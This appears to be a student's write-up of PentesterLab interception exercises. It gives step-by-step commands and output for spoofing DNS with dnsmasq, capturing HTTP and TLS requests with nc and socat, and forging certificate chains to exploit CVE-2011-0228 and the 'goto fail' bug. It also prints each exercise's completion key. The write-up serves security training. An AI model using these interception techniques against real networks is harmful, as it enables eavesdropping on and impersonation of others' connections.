## Intercept Badge

### Intercept 01

Setting up `dnsmasq` on `$vps`

```
# https://linuxhint.com/dnsmasq_ubuntu_server/#:~:text=dnsmasq%20is%20available%20in%20the,and%20disable%20systemd%2Dresolved%20services.
$ sudo service dnsmasq stop
$ sudo dnsmasq -C dnsmasq.conf --no-daemon
$ dig @localhost test1.pentesterlab.com
$ host test1.pentesterlab.com 127.0.0.1
```

Intercepting DNS request

```
$ sudo tcpdump -i eth0 udp port 53
$ echo "18.191.42.249    mitm1.pentesterlab.com" > dnsmasq.hosts 
```

Intercepting HTTP request

```
$ sudo nc -lvp 80
Listening on [0.0.0.0] (family 0, port 80)
Connection from 163-172-214-251.rev.poneytelecom.eu 48215 received!
GET / HTTP/1.1
Host: mitm1.pentesterlab.com
PTL_KEY: 4905e0a2-ed2d-4031-a31a-1221c95e488f
Connection: Close
```

### Intercept 02

- To create a simple TCP server with TLS support we need to create a certificate using openssl.
- It's worth automating this as you may do this often during a security assessment.

```
$ cat create_cert.sh

FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```

After intercepting DNS request, we intercept HTTPS requests

```
$ echo "18.191.42.249    mitm2.pentesterlab.com" > dnsmasq.hosts
$ sudo dnsmasq -C dnsmasq.conf --no-daemon
$ sudo nc -lvp 443 # nc doesn't do https
```

We need to use `socat` for https

```
$ sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
> 2020/06/07 16:10:44.034462  length=114 from=0 to=113
GET / HTTP/1.1\r
Host: mitm2.pentesterlab.com\r
PTL_KEY: 3cfb4ed5-8529-4d17-998a-7ee3b6ebd2b1\r
Connection: Close\r
```

### Intercept 03

First get the DNS request and intercept HTTPS using that
```
$ sudo tcpdump -i eth0 udp port 53
$ echo "18.191.42.249    mitm3.pentesterlab.com" > dnsmasq.hosts
$ sudo dnsmasq -C dnsmasq.conf --no-daemon
```

Use the provided certificate to set up a TLS listener

```
# after downloading hackingwithpentesterlab.link.crt, GandiStandardSSLCA2.pem and hackingwithpentesterlab.link.key from pentesterlab.com
$ sudo socat openssl-listen:443,reuseaddr,fork,cert=hackingwithpentesterlab.link.crt,cafile=GandiStandardSSLCA2.pem,key=hackingwithpentesterlab.link.key,verify=0 -  
GET / HTTP/1.1
Host: mitm3.pentesterlab.com
PTL_KEY: 0ca2d12c-37f5-4292-a8b6-6a015bb52161
Connection: Close

```

### CVE-2011-0228

Validating a certificate's validity can be divided into multiple steps:

- Ensuring the current certificate did not expired and is valid for the current time (the issue date is not in the future)..
- Ensuring that the current certificate is signed by a valid certificate authority (CA).
- Ensuring that the parent certificate is a certificate authority.

These checks are performed for all certificates in the certificate chain to established a chain of trust. The first certificate (root CA) is embedded in your browser/system and is already trusted. If all certificates in the chain can be validated, the leaf certificate (last certificate in the chain) can be trusted.

This issue is located in the last step of the verification: "ensuring that the parent certificate is a certificate authority". 

```
$ openssl x509 -in hackingwithpentesterlab.link.crt -text
$ openssl genrsa -out mitm4.pentesterlab.com.key 2048 #fqdn=mitm4.pentesterlab.com
$ openssl req -new -sha256 -key mitm4.pentesterlab.com.key -out mitm4.pentesterlab.com.csr
```

Directory structure required to create certificate out of csr

```
$ mkdir -p demoCA/private demoCA/newcerts
$ cp hackingwithpentesterlab.link.key demoCA/private/cakey.pem
$ cp hackingwithpentesterlab.link.crt demoCA/cacert.pem
$ touch demoCA/index.txt
$ echo 01 > demoCA/serial
```

Signing the csr and creating the chain `myca.pem`

```
$ openssl ca   -config openssl.cnf -verbose  -out mitm4.pentesterlab.com.crt -infiles mitm4.pentesterlab.com.csr
$ cat mitm4.pentesterlab.com.crt hackingwithpentesterlab.link.crt GandiStandardSSLCA2.pem > myca.pem
```

Setting up the malicious server (openssl doesn't work on an invalid chain)

```
$ wget https://tls.mbed.org/download/mbedtls-2.2.1-apache.tgz
$ tar -zxf mbedtls-2.2.1-apache.tgz
$ cd mbedtls-2.2.1
$ apt-get update && apt-get upgrade #hygiene
$ apt-get install build-essential
$ make
```

Running the server

```
$ echo "18.191.42.249    mitm4.pentesterlab.com" > dnsmasq.hosts
$ sudo dnsmasq -C dnsmasq.conf --no-daemon
$ sudo ./mbedtls-2.2.1/programs/ssl/ssl_server

  . Loading the server cert. and key... ok
  . Bind on https://localhost:443/ ... ok
  . Seeding the random number generator... ok
  . Setting up the SSL data.... ok
  . Waiting for a remote connection ... ok
  . Performing the SSL/TLS handshake... ok
  < Read from client: 114 bytes read

GET / HTTP/1.1
Host: mitm4.pentesterlab.com
PTL_KEY: 80c8b7d1-1e4c-4fa8-8390-939b16edb127
Connection: Close
```

### CVE-2014-1266

[goto fail;](https://opensource.apple.com/source/Security/Security-55471/libsecurity_ssl/lib/sslKeyExchange.c?txt) also bypasses public key pinning

```
$ sudo tcpdump -i eth0 udp port 53 # the victim is trying to access pentesterlab.com so we download and send the cert to our vps
$ scp -i ~/u5.pem pentesterlab.com ubuntu@ec2-18-191-42-249.us-east-2.compute.amazonaws.com:/home/ubuntu/ptlab/intercept/cve-2014-1266
$ openssl s_client -connect pentesterlab.com:443 -showcerts > pentesterlab.pem # also change mbedtls as shown in the course intructions
$ sudo ./mbedtls-2.2.1/programs/ssl/ssl_server 

  . Loading the server cert. and key... ok
  . Bind on https://localhost:443/ ... ok
  . Seeding the random number generator... ok
  . Setting up the SSL data.... ok
  . Waiting for a remote connection ... ok
  . Performing the SSL/TLS handshake... ok
  < Read from client: 108 bytes read

GET / HTTP/1.1
Host: pentesterlab.com
PTL_KEY: e530e0a6-65f6-42a4-9147-a4386ee133e1
Connection: Close
```

